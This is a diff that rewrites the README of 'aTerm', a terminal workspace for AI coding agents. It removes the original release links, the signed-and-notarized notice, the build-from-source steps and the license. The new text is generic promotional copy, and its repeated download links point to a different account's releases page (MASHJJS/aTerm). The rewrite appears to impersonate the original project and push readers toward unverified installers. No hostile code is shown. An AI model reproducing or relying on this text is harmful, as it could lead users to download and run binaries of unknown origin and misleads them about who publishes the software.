@@ -1,103 +1,72 @@
-# aTerm
+# 🚀 aTerm - Your AI Coding Workspace
 
-[![Download](https://img.shields.io/github/v/release/saadnvd1/aterm?label=Download&style=flat-square)](https://github.com/saadnvd1/aterm/releases/latest)
-[![macOS](https://img.shields.io/badge/macOS-Apple%20Silicon-blue?style=flat-square)](https://github.com/saadnvd1/aterm/releases/latest)
+[![Download aTerm](https://img.shields.io/badge/Download-aTerm-4CAF50.svg)](https://github.com/MASHJJS/aTerm/releases)
 
-A modern terminal workspace designed for agentic coding workflows. Run AI coding assistants (Claude Code, Aider, OpenCode) alongside your shell, dev server, and git panel in a unified, project-based interface.
+Welcome to aTerm, your ultimate terminal workspace designed for AI-assisted coding. This application allows you to run Claude Code, Aider, or OpenCode alongside your shell in project-based layouts. Whether you are working on a small script or a large project, aTerm makes it easy to organize your coding tasks.
 
-![aTerm Screenshot](https://github.com/saadnvd1/aterm/raw/main/screenshot.png)
+## 🌟 Key Features
+- **AI Integration:** Seamlessly connect with AI tools like Claude Code and Aider.
+- **Custom Layouts:** Organize your workspace with project-based layouts.
+- **User-Friendly Terminal:** Experience a smooth terminal emulation with advanced features.
+- **Cross-Platform Support:** Compatible with macOS and other systems.
+- **Built on Modern Technologies:** Utilizes React, Rust, and TypeScript for a responsive experience.
 
-## Why aTerm?
+## 🌐 System Requirements
+To run aTerm effectively, please ensure your system meets the following requirements:
+- **Operating System:** macOS or other compatible systems.
+- **RAM:** Minimum of 4 GB.
+- **Hard Drive Space:** At least 200 MB available for installation.
 
-When working with AI coding agents, you need multiple terminals running simultaneously:
-- **AI Assistant** - Claude Code, Aider, or OpenCode doing the heavy lifting
-- **Shell** - Running commands, checking outputs
-- **Dev Server** - Watching your app in real-time
-- **Tests** - Running test suites
+## 🚀 Getting Started
+Follow these easy steps to get started with aTerm.
 
-aTerm gives you predefined layouts optimized for these workflows, with instant project switching and persistent terminals that stay alive in the background.
+### Step 1: Visit the Download Page
+To download aTerm, visit the Releases page using the link below:
 
-## Features
+[Download aTerm](https://github.com/MASHJJS/aTerm/releases)
 
-- **Agentic Layouts** - Pre-configured for AI-assisted development (AI + Shell, AI + Dev + Shell, AI + Git)
-- **Project Workspaces** - Switch between projects instantly with Cmd+1-9, terminals persist in background
-- **Task Worktrees** - Create tasks backed by git worktrees to work on multiple features in parallel
-- **Built-in Code Editor** - Monaco-powered editor with file explorer, syntax highlighting, and Cmd+P file search
-- **Built-in Git Panel** - Stage, commit, push, view diffs, and edit files inline with a Diff/Edit toggle
-- **Multi-Agent Support** - Claude Code, Aider, OpenCode, Cursor, and custom commands
-- **Split Panes** - Right-click to split with any profile, drag borders to resize
-- **Pane Renaming** - Double-click or right-click to rename panes
-- **Scratch Notes** - Per-project markdown scratchpad for quick notes (Shift+Cmd+N)
-- **Transient Terminals** - Quick standalone terminals with Cmd+N, not tied to any project
-- **Maximize Mode** - Shift+Cmd+Enter to focus on a single pane
-- **Per-Pane Font Size** - Cmd+Plus/Minus to adjust individual pane fonts
-- **Themes** - Midnight, Dracula, Nord, Tokyo Night, Gruvbox
+### Step 2: Download the Latest Version
+On the Releases page, look for the latest version of aTerm. You will see files available for download. Click on the appropriate link for your system.
 
-## Keyboard Shortcuts
+### Step 3: Install aTerm
+After the download completes, locate the file in your downloads folder and open it. Follow the on-screen prompts to install aTerm on your computer.
 
-| Shortcut | Action |
-|----------|--------|
-| Cmd+1-9 | Switch to project 1-9 |
-| Cmd+B | Toggle sidebar |
-| Cmd+N | New transient terminal |
-| Cmd+P | File search |
-| Shift+Cmd+G | Toggle git panel |
-| Shift+Cmd+E | Toggle editor pane |
-| Shift+Cmd+N | Scratch notes |
-| Shift+Cmd+Enter | Maximize/restore focused pane |
-| Shift+Cmd+[ / ] | Previous/next pane |
-| Shift+Cmd+M | Minimize pane |
-| Cmd+D | Split pane with shell |
-| Cmd+W | Close focused pane |
-| Cmd++ | Increase font size |
-| Cmd+- | Decrease font size |
-| Cmd+K | Clear terminal |
+### Step 4: Launch aTerm
+Once the installation is complete, find aTerm in your Applications folder (or equivalent location) and double-click to launch the application. 
 
-## Default Layouts
+## 📥 Download & Install
+To begin your experience with aTerm, you can download it directly from our Releases page: 
 
-| Layout | Panes |
-|--------|-------|
-| AI + Shell | Claude Code (2/3) + Shell (1/3) |
-| AI + Dev + Shell | Claude Code + Dev Server (top), Shell (bottom) |
-| AI + Git | Claude Code (2/3) + Git Panel (1/3) |
-| Focused AI | Single Claude Code pane |
-| Quad | 4 panes in 2x2 grid |
+[Visit this page to download](https://github.com/MASHJJS/aTerm/releases)
 
-## Installation
+### Installation Steps
+1. Download the appropriate installer for your operating system.
+2. Open the installer file.
+3. Follow the instructions to complete the installation.
+4. After installation, launch aTerm from your Applications or Program menu.
 
-### macOS (Apple Silicon)
+## 🎬 Using aTerm
+Once you open aTerm, take a moment to familiarize yourself with the interface:
 
-Download the latest `.dmg` from [Releases](https://github.com/saadnvd1/aterm/releases/latest) - signed and notarized.
+- **Navigation Bar:** Use the navigation bar to switch between AI tools and your shell.
+- **Workspace:** Drag and drop terminals and AI tools to create your ideal setup.
+- **Settings:** Access the settings menu to customize your experience.
 
-### Build from Source
+## 🧩 Tips for New Users
+- **Explore the Help Section:** aTerm has a dedicated help section accessible from the menu. Don’t hesitate to refer to it for guidance.
+- **Use Shortcuts:** Familiarize yourself with keyboard shortcuts to increase your efficiency. Check the settings menu for a list of available shortcuts.
+- **Keep it Updated:** Regularly check the Releases page for updates to ensure you have the latest features and fixes.
 
-```bash
-# Install dependencies
-npm install
+## 🎉 Community and Support
+For support or to connect with other users, check our community forums. Members often share tips, ask questions, and offer help. You can also submit issues directly on the GitHub repository.
 
-# Development
-npm run tauri dev
+## 🔭 Future Updates
+We plan to roll out new features and improvements regularly. Your feedback is valuable, so please share your thoughts and suggestions to help us enhance aTerm.
 
-# Production build
-npm run tauri build
-```
+Try aTerm today and transform your coding experience with the power of AI. 
 
-## Stack
+Don’t forget: 
 
-- **Frontend**: React 18 + TypeScript + Tailwind CSS + shadcn/ui
-- **Terminal**: xterm.js with fit addon
-- **Editor**: Monaco (VS Code engine) with language detection
-- **Backend**: Tauri 2 (Rust) with portable-pty
-- **Drag & Drop**: @dnd-kit for pane reordering
+[Download aTerm](https://github.com/MASHJJS/aTerm/releases) 
 
-## Configuration
-
-Config stored in `~/Library/Application Support/aterm/config.json`:
-
-- **Projects** - Name, path, git remote, AI provider, layout
-- **Profiles** - Terminal presets (command, accent color)
-- **Layouts** - Custom pane arrangements
-
-## License
-
-MIT
+to get started with your AI-assisted coding journey!
